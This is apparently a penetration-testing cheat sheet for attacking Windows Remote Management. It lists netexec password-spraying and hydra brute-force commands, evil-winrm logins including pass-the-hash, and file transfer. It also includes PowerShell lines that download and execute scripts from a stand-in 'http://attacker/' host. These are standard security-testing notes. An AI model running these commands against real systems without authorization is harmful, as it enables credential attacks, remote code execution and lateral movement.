# WinRM Enumeration (5985, 5986)

## Test anonymous access with netexec
```bash
netexec winrm $IP -u '' -p ''
```

## Connect with evil-winrm
```bash
# -p password for password auth OR -H ntlm_hash for pass-the-hash
evil-winrm -i $IP -u administrator -p password
```

## Connect with evil-winrm over SSL
```bash
evil-winrm -i $IP -u administrator -p password -S
```

## Password spray with netexec
```bash
netexec winrm $IP -u users.txt -p 'Password123!' --continue-on-success
```

## Brute force with hydra
```bash
hydra -L users.txt -P passwords.txt -t 1 -V $IP winrm
```

## Upload file with evil-winrm
```bash
upload /local/path/file.exe C:\temp\file.exe
```

## Download file with evil-winrm
```bash
download C:\temp\file.txt /local/path/file.txt
```

---

# WinRM Enumeration Methodology

## Initial Reconnaissance

1. Identify WinRM service on port 5985 (HTTP) or 5986 (HTTPS)
2. Test for anonymous/guest access
3. Attempt password spraying with common passwords
4. If credentials obtained, connect for remote execution
5. Enumerate system for privilege escalation
6. Use WinRM for lateral movement

## Service Ports

**5985/tcp: WinRM HTTP**
Unencrypted WinRM over HTTP.

**5986/tcp: WinRM HTTPS**
Encrypted WinRM over HTTPS with SSL/TLS.

**Check SSL/TLS:**
```bash
nmap -p 5986 --script ssl-enum-ciphers $IP
```

## WinRM Basics

**What is WinRM:**
Windows Remote Management. Microsoft's implementation of WS-Management protocol for remote management.

**Requirements:**
- Valid domain or local credentials
- User must be in "Remote Management Users" group or administrators

**Advantages over RDP:**
- Command-line focused
- Lower resource usage
- Bypasses some firewall rules that block RDP

## Authentication Testing

**Test with netexec:**
```bash
netexec winrm $IP -u administrator -p password
```

**Test guest account:**
```bash
netexec winrm $IP -u 'guest' -p ''
```

**Test with empty credentials:**
```bash
netexec winrm $IP -u '' -p ''
```

## Password Spraying

**Best practices:**
- One password against many users
- Common passwords: Password123!, Welcome123!, CompanyName2024!
- Monitor for lockouts
- Use --continue-on-success to test all users

**Example:**
```bash
netexec winrm $IP -u users.txt -p 'Password123!' --continue-on-success
```

## Evil-WinRM Connection

**Username/Password:**
```bash
evil-winrm -i $IP -u administrator -p password
```

**Pass-the-Hash:**
```bash
evil-winrm -i $IP -u administrator -H ntlm_hash
```

**Domain authentication:**
```bash
evil-winrm -i $IP -u 'username@domain.local' -p password
```

**HTTPS (port 5986):**
```bash
evil-winrm -i $IP -u administrator -p password -S
```

## Evil-WinRM Features

**Built-in commands:**
- upload: Transfer files to target
- download: Transfer files from target
- services: Manage services
- menu: Show available commands

**PowerShell execution:**
Once connected, you have full PowerShell access.

**Loading scripts:**
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1')
```

## File Transfer

**Upload files:**
```
evil-winrm> upload /local/path/file.exe C:\temp\file.exe
```

**Download files:**
```
evil-winrm> download C:\temp\file.txt /local/path/file.txt
```

**Alternative via PowerShell:**
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')
(New-Object Net.WebClient).DownloadFile('http://attacker/file.exe', 'C:\temp\file.exe')
```

## Initial Enumeration

**System information:**
```powershell
systeminfo
whoami /all
net user
net localgroup administrators
```

**Network information:**
```powershell
ipconfig /all
netstat -an
arp -a
```

**Domain information (if domain joined):**
```powershell
nltest /domain_trusts
net group "Domain Admins" /domain
```

## Privilege Escalation

## WinRM Configuration

**Check WinRM configuration (if admin access):**
```powershell
winrm get winrm/config
winrm get winrm/config/listener
winrm get winrm/config/service/auth
winrm get winrm/config/client
```

**Enable WinRM (if disabled):**
```powershell
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true
```

## Common Misconfigurations

1. **Basic authentication enabled**
2. **Unencrypted traffic allowed** (port 5985)
3. **Weak authentication requirements**
4. **Overly permissive trusted hosts**
5. **Default credentials** not changed
6. **Remote Management Users** group too permissive

## Attack Workflow

1. Identify WinRM ports open
2. Enumerate valid users (from other services)
3. Password spray with common passwords
4. Connect with evil-winrm or PowerShell remoting
5. Initial system enumeration
6. Privilege escalation vector identification
7. Establish persistence
8. Lateral movement to other systems

## Enumeration Checklist

- [ ] Service discovery and version identification
- [ ] Authentication testing (anonymous, guest)
- [ ] Password spraying with common passwords
- [ ] Brute force attacks (if other methods fail)
- [ ] Connection establishment via various methods
- [ ] Initial enumeration of target system
- [ ] Privilege escalation vector identification
- [ ] Persistence establishment
- [ ] Lateral movement opportunities

## Common WinRM Ports

- 5985/tcp: WinRM HTTP
- 5986/tcp: WinRM HTTPS


---

# References

- https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
- https://github.com/Hackplayers/evil-winrm
- https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/
